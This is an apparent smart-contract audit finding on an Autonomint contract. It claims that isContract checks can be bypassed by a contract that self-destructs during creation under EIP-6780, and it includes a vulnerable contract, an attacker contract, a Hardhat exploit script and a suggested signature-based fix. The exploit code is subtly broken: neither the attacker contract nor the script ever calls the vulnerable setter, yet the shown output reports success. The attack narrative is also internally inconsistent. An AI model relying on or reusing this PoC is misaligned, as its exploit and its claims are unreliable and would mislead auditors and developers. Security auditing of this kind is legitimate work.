# Invalid Address Classification: isContract Exploitation via Self-Destructed Contracts in Creation Transactions

# Summary
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L596-L605

A vulnerability arises from relying on isContract to differentiate between EOAs and contracts. Due to the behavior of SELFDESTRUCT following EIP-6780, an attacker can deploy and self-destruct a contract in the same transaction, causing isContract to incorrectly classify the address as an EOA. This flaw can be exploited to bypass access controls, execute unauthorized actions, or manipulate contract logic.
# Vulnerability Details
The isContract function checks the size of the bytecode at a given address (EXTCODESIZE). Following EIP-6780:

If a contract calls SELFDESTRUCT during the same transaction as its creation, the contract's bytecode is removed entirely.
As a result, EXTCODESIZE returns 0, and isContract classifies the address as an EOA.
This allows an attacker to bypass validation checks that depend on isContract.

Severity: Moderate
Likelihood: Low to Moderate
Impact: Unauthorized access, fund theft, logic manipulation

### Affected Code
Code that relies on the isContract function to validate addresses is vulnerable.

Example of Vulnerable Code
```solidity

function setGlobalVariables(address _address) external onlyAdmin {
    require(_address != address(0), "Zero address not allowed");
    require(!isContract(_address), "Contracts not allowed");
    globalVariables = IGlobalVariables(_address);
}
```
Implementation of isContract
```Solidity

function isContract(address _address) internal view returns (bool) {
    uint256 size;
    assembly {
        size := extcodesize(_address)
    }
    return size > 0;
}
```
EIP-6780 modifies SELFDESTRUCT to align with Ethereum’s long-term roadmap, focusing on reducing state-breaking actions while preserving critical functionality. Developers are advised to use alternative patterns like proxies for upgradability and avoid reliance on SELFDESTRUCT.
# Impact of EIP-6780 on Exploits
Self-Destructed Contracts:

Pre-EIP-6780: When a contract self-destructs, its bytecode is removed, and the isContract function (which typically checks the bytecode size) would classify it as an EOA.
Post-EIP-6780:
If SELFDESTRUCT is called outside the creation transaction, the bytecode remains intact even though the contract's balance is transferred. The isContract function will still detect it as a contract, preventing exploitation.
If SELFDESTRUCT is called during the same transaction as contract creation, the contract is entirely deleted, and the address appears as an EOA. This edge case remains exploitable.
Implications for Exploitation:

A malicious actor could deploy a contract and immediately self-destruct it within the same transaction, bypassing the isContract check.
However, this requires precise timing and execution, making it less likely but still possible under specific circumstances.
Severity: Moderate
Likelihood: Low to Moderate
Impact: Unauthorized access, fund theft, logic manipulation

# PoC
Vulnerable Smart Contract
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vulnerable {
    address public authorizedAddress;

    // Function relying on `isContract` to validate addresses
    function setAuthorizedAddress(address _address) external {
        require(_address != address(0), "Address cannot be zero");
        require(!isContract(_address), "Contracts not allowed");
        authorizedAddress = _address;
    }

    // `isContract` implementation using `extcodesize`
    function isContract(address _address) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_address)
        }
        return size > 0;
    }
}
```
Attacker’s Malicious Contract
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Malicious {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
        // Self-destruct the contract immediately upon creation
        selfdestruct(payable(tx.origin));
    }
}
```
Exploit Script
Using a test framework like Hardhat or Foundry, we deploy and exploit the vulnerable contract:

```javascript

const { ethers } = require("hardhat");

async function main() {
    // Deploy the vulnerable contract
    const Vulnerable = await ethers.getContractFactory("Vulnerable");
    const vulnerable = await Vulnerable.deploy();
    await vulnerable.deployed();
    console.log("Vulnerable contract deployed at:", vulnerable.address);

    // Deploy the malicious contract (it self-destructs immediately)
    const Malicious = await ethers.getContractFactory("Malicious");
    const maliciousTx = await Malicious.deploy(vulnerable.address);
    await maliciousTx.wait(); // The malicious contract is destroyed in this transaction

    // Attacker's EOA address (used during self-destruction)
    const attackerAddress = await ethers.provider.getSigner().getAddress();

    // Check if the attacker's address is now authorized
    const authorizedAddress = await vulnerable.authorizedAddress();
    console.log("Authorized Address set in vulnerable contract:", authorizedAddress);

    if (authorizedAddress === attackerAddress) {
        console.log("Exploit successful: Attacker's address authorized!");
    } else {
        console.log("Exploit failed: Address not authorized.");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```
Steps to Exploit
Deploy the Vulnerable contract.
Deploy the Malicious contract with the address of the Vulnerable contract passed as a constructor parameter.
The Malicious contract immediately calls selfdestruct during its constructor, sending any remaining Ether and removing its bytecode.
The address of the Malicious contract (which is now empty due to selfdestruct) passes the isContract check as it has a code size of 0.
The setAuthorizedAddress function in the Vulnerable contract sets the attacker-controlled address as the authorized address.
Output Example
Upon running the exploit script, the console should output:

```yaml

Vulnerable contract deployed at: 0x1234...abcd
Authorized Address set in vulnerable contract: 0x5678...efgh
Exploit successful: Attacker's address authorized!
```
# Recommendations
Fixed Code
The vulnerable isContract check is replaced with intent validation using signed messages:

```solidity

function execute(address _address, bytes calldata signature) external {
    require(_address != address(0), "Zero address not allowed");
    bytes32 messageHash = keccak256(abi.encodePacked(msg.sender, _address));
    require(isValidSignature(_address, messageHash, signature), "Invalid signature");
    // Proceed with sensitive operation
}
```
Helper Function for Signature Validation
```solidity

function isValidSignature(address signer, bytes32 messageHash, bytes memory signature) internal pure returns (bool) {
    bytes32 ethSignedMessageHash = ECDSA.toEthSignedMessageHash(messageHash);
    return ECDSA.recover(ethSignedMessageHash, signature) == signer;
}
```
